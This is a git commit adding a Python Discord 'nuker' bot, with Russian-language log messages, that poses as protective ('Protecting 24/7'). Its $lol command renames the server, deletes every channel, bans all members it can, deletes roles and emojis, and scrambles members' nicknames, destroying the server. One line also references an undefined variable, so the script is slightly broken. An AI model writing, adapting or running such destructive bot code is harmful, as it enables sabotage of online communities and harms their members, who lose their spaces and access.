064e47987397a21730a28f11e8b4e51f87b07814
GLUTEN <57950551+GlUTEN-BASH@users.noreply.github.com>
2020-11-09 16:48:53 +0300

    Добавить бота
    Ладна

---
+++ modded.py
@@ -0,0 +1,74 @@
+import discord, os, sys, random, string, requests
+from discord.ext import commands
+from discord import Permissions
+from colorama import Fore, init
+os.system('clear')
+init()
+
+client = commands.Bot(command_prefix='$')
+
+@client.event
+async def on_ready():
+    await client.change_presence(status=discord.Status.dnd, activity=discord.Game('Protecting 24/7'))
+    print(f"""{Fore.RED}
+
+  ____ _    _   _ _____ _____ _   _ 
+ / ___| |  | | | |_   _| ____| \ | |
+| |  _| |  | | | | | | |  _| |  \| |
+| |_| | |__| |_| | | | | |___| |\  |
+ \____|_____\___/  |_| |_____|_| \_|
+
+{Fore.RED} Здрасьте, это ГЛЮТЕН и
+{Fore.RED} Ебань с плясками начинается""")
+
+@client.command()
+async def lol(ctx):
+    await ctx.guild.edit(name="Осторожно! Зачищено")
+    print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
+    print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
+    for channel in ctx.guild.channels:
+        await channel.delete()
+        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
+    print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
+    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
+    for member in ctx.guild.members:
+        try:
+            await member.ban()
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Бан этому{Fore.WHITE}: {member}")
+        except:
+            continue
+    print(f"{Fore.WHITE}> {Fore.RED}Усе, кого мох забанил, а мог я:{ban} человек{Fore.WHITE}.")
+    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
+    roles = ctx.guild.roles
+    roles.pop(0)
+    for role in roles:
+        if ctx.guild.me.roles[-1] > role:
+            await role.delete()
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
+        else:
+            break
+    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
+    char = string.ascii_letters + string.digits
+    for member in ctx.guild.members:
+        nickname = ''.join((random.choice(char) for i in range(16)))
+        try:
+            await member.edit(nick=nickname)
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Поиграем в маскарад? Твоя маска {nickname}")
+        except Exception as e:
+            continue
+    print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")
+    for emoji in list(ctx.guild.emojis):
+        try:
+            await emoji.delete()
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
+        except:
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
+    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")
+    print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
+
+try:
+    client.run('токен сюда')
+except Exception:
+    pass
+except KeyboardInterrupt:
+    sys.exit()
